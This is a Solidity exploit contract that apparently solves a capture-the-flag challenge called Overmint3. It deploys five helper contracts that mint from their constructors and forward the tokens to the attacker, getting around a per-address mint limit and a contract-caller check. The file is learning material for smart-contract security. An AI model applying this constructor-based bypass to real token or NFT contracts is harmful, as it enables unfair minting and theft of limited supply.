// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "./Overmint3.sol";

contract SolveOvermint3 {
    constructor(Overmint3 instance) {
        for (uint i = 0; i < 5; ++i) new Solver(instance, msg.sender, i + 1);
    }
}

contract Solver {
    constructor(Overmint3 instance, address attacker, uint id) {
        instance.mint();
        instance.transferFrom(address(this), attacker, id);
    }
}
